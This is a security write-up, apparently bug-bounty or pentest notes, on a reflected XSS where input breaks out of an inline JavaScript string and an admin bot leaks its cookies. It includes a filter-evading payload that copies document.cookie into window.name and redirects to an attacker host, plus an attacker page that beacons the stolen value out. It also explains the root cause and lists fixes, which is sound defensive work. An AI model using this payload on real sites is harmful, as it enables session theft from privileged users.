# JavaScript String Breakout With `window.name` Bot Exfil

## Date

2026-07-09

## Target Type

Web apps that reflect user input into a JavaScript string and provide an admin/support bot that visits attacker-controlled same-origin URLs

## Bug Class

Reflected XSS, JavaScript string breakout, admin bot abuse, cookie disclosure

## Initial Signal

- A parameter is reflected inside inline JavaScript rather than HTML.
- The target also exposes a report/share/send-to-admin feature.
- A WAF blocks typical XSS syntax, pushing the exploit toward minimal statements instead of full payloads.

## Failed Assumptions

- A harsh character filter means XSS is impossible.
- External webhooks are always the easiest exfil path.
- `window.name` is only useful with popups.
- Reusing an existing attacker host is good enough even when bot-side caching is possible.

## Working Theory

If `"` is still allowed inside a reflected JavaScript string, the attacker may only need a few legal statements:

1. close the string
2. assign `document.cookie` into `window.name`
3. navigate to an attacker-controlled origin

If the destination page can read `window.name`, it can turn the cross-origin state into an attacker-visible request.

## Final Root Cause

The application placed attacker input inside:

```javascript
var message = "PAYLOAD";
```

without safe encoding for JavaScript-string context. The admin bot later visited attacker-controlled same-origin URLs with sensitive cookies. In the observed browser/runtime, top-level cross-origin navigation preserved `window.name`, allowing the attacker page to recover the cookie after navigation.

## Minimal Reproduction

Victim-side payload:

```text
";name=document.cookie;location='//[attacker-host]'//
```

Attacker page:

```html
<!doctype html><meta charset="utf-8"><title>x</title><body>loading<script>document.body.textContent=window.name||"empty";(new Image).src="/x?d="+encodeURIComponent(window.name||"empty")</script>
```

## Why Failed Payloads Failed

- Payloads requiring `()` or `+` were blocked by the filter before execution.
- Off-site beacons added more moving parts than needed and gave weaker visibility than attacker-host request logs.
- Reusing an older host risked stale content or propagation ambiguity.
- The first share to a brand-new host may race propagation and return `404` to the bot.

## Why Working Test Worked

- `"` cleanly terminates the reflected string.
- `name=document.cookie` requires only identifiers, `=`, and `.`, all WAF-safe in this case.
- `location='//host'` avoids a colon by using a protocol-relative URL.
- The attacker page does not need external networking. It logs the stolen value back to its own origin as `/x?d=...`, which is easy to confirm from server-side logs.

## Fix

- Do not inject untrusted input into inline JavaScript.
- If unavoidable, escape for JavaScript-string context.
- Mark sensitive cookies `HttpOnly`.
- Do not let privileged bots browse attacker-controlled same-origin pages.

## Future Checklist Item

When a reflected sink is in JavaScript-string context and the filter blocks concatenation/function syntax, test whether `window.name` can carry data across a top-level cross-origin navigation before spending time on complex encoder gadgets.
